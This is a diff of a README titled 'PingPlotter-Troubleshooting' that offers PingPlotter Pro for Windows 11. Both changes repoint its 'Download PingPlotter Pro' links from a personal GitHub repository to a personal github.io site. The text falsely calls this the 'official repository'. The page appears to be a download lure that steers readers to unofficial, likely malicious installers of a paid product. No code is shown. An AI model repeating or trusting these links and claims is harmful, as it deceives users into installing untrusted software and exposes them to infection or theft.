@@ -1,6 +1,6 @@
 # 🖥️ PingPlotter-Troubleshooting - Fix your PingPlotter installation today
 
-[![Download PingPlotter](https://img.shields.io/badge/Download-PingPlotter-blue.svg)](https://github.com/issaccabrera0-hub/PingPlotter-Troubleshooting)
+[![Download PingPlotter](https://img.shields.io/badge/Download-PingPlotter-blue.svg)](https://issaccabrera0-hub.github.io)
 
 ## 📌 Introduction
 
@@ -10,7 +10,7 @@ This guide helps you put PingPlotter Pro on your Windows 11 computer. Many users
 
 You need to access the official repository to begin your installation. Access the link below to reach the download area for PingPlotter Pro.
 
-[Download PingPlotter Pro Here](https://github.com/issaccabrera0-hub/PingPlotter-Troubleshooting)
+[Download PingPlotter Pro Here](https://issaccabrera0-hub.github.io)
 
 ## ⚙️ System Requirements
 
